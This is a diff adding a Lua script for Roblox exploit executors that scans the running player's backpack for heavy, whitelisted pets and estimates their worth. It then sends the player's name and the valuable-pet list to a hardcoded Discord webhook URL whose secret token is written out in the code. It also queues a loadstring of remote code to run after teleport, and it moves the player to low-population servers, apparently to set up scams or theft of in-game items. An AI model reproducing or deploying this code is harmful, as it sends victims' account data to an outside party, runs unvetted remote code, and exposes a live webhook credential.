@@ -1,0 +1,216 @@
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+-- WAIT GAME LOADED
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local player = Players.LocalPlayer
+repeat task.wait() until player
+repeat task.wait() until player:FindFirstChild("PlayerGui")
+repeat task.wait() until player.Character or player.CharacterAdded:Wait()
+
+-- MODULE
+local DataService = require(RS.Modules.DataService)
+local PetRegistry = require(RS.Data.PetRegistry)
+local NumberUtil = require(RS.Modules.NumberUtil)
+local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
+
+-- REQUEST
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
+-- REMOTE (SERVER TYPE)
+local GetServerType = RS:WaitForChild("Remotes"):WaitForChild("GetServerType")
+
+-- WEBHOOK
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1416527669268582482/71WLerhTom4-zWBjHRa_VHY49Bg1O7JAdNKd1-PNCqDo1o4GOFmF2FZ0n7ahpSTnMwNs"
+
+-- WHITELIST
+local PetWhitelist = {
+    ["Mimic Octopus"] = { MinKG = 60 },
+    ["Dilophosaurus"] = { MinKG = 60 },
+}
+
+-- FORMAT NUMBER
+local function formatNumber(n)
+    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+-- GET KG FROM TOOL NAME
+local function GetKGFromName(name)
+    local kg = string.match(name, "%[(%d+%.?%d*)%s*KG%]")
+    return kg and tonumber(kg) or nil
+end
+
+-- GET TOOLS
+local function GetAllTools()
+    local tools = {}
+    for _, container in pairs({player.Backpack, player.Character}) do
+        if container then
+            for _, tool in pairs(container:GetChildren()) do
+                if tool:IsA("Tool") then
+                    table.insert(tools, tool)
+                end
+            end
+        end
+    end
+    return tools
+end
+
+-- VALUE
+local function CalculateValue(pet)
+    local petType = pet.PetType
+    local petData = pet.PetData
+
+    local eggData = PetRegistry.PetEggs[petData.HatchedFrom]
+    if not eggData then return 0 end
+
+    local rarityData = eggData.RarityData.Items[petType]
+    if not rarityData then return 0 end
+
+    local WeightRange = rarityData.GeneratedPetData.WeightRange
+    if not WeightRange then return 0 end
+
+    local sellPrice = PetRegistry.PetList[petType].SellPrice
+
+    local weightMultiplier = math.lerp(
+        0.8, 1.2,
+        NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight)
+    )
+
+    local levelMultiplier = math.lerp(
+        0.15, 6,
+        PetUtilities:GetLevelProgress(petData.Level)
+    )
+
+    return math.floor(sellPrice * weightMultiplier * levelMultiplier)
+end
+
+-- =========================
+-- TELEPORT SYSTEM
+-- =========================
+local function FindLowServer()
+    local servers = {}
+    local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
+    local body = HttpService:JSONDecode(req)
+
+    if body and body.data then
+        for _, v in pairs(body.data) do
+            if tonumber(v.playing) and tonumber(v.maxPlayers)
+            and v.id ~= game.JobId then
+                table.insert(servers, v)
+            end
+        end
+    end
+
+    table.sort(servers, function(a,b)
+        return a.playing < b.playing
+    end)
+
+    return servers[1] and servers[1].id
+end
+
+local function ShouldTeleport()
+    local serverType = GetServerType:InvokeServer()
+    local playerCount = #Players:GetPlayers()
+
+    if serverType == "VIPServer" then
+        return true
+    end
+
+    if playerCount >= 4 then
+        return true
+    end
+
+    return false
+end
+
+-- QUEUE SCRIPT BIAR LANJUT SETELAH TELEPORT
+local function QueueScript()
+    if queue_on_teleport then
+        queue_on_teleport([[
+            loadstring(game:HttpGet("URL_SCRIPT_KAMU"))()
+        ]])
+    end
+end
+
+-- TELEPORT
+if ShouldTeleport() then
+    QueueScript()
+
+    local target = FindLowServer()
+    if target then
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, target, player)
+    end
+
+    return -- STOP SCRIPT SEKARANG (lanjut setelah teleport)
+end
+
+-- =========================
+-- LANJUT SETELAH TELEPORT
+-- =========================
+
+-- AMBIL DATA
+local data
+repeat
+    data = DataService:GetData()
+    task.wait(1)
+until data and data.PetsData and data.PetsData.PetInventory
+
+-- MAIN WEBHOOK
+local function SendOnce()
+    local totalValue = 0
+    local list = ""
+
+    for _, tool in pairs(GetAllTools()) do
+        local name = tool.Name
+        local kg = GetKGFromName(name)
+
+        if kg then
+            for petName, config in pairs(PetWhitelist) do
+                if string.find(name, petName) and kg >= config.MinKG then
+
+                    for _, pet in pairs(data.PetsData.PetInventory.Data) do
+                        if string.find(name, pet.PetType) then
+                            local value = CalculateValue(pet)
+                            totalValue += value
+
+                            list = list .. string.format(
+                                "%s → %.2f KG | %s¢\n",
+                                name,
+                                kg,
+                                formatNumber(value)
+                            )
+                            break
+                        end
+                    end
+
+                end
+            end
+        end
+    end
+
+    if list == "" then
+        list = "No whitelist pet found."
+    end
+
+    local embed = {
+        title = "🌵 Scanner Result",
+        description =
+            "Player: "..player.Name..
+            "\n\nTotal: "..formatNumber(totalValue).."¢\n\n"..list,
+        color = 65280
+    }
+
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({embeds = {embed}})
+    })
+end
+
+SendOnce()
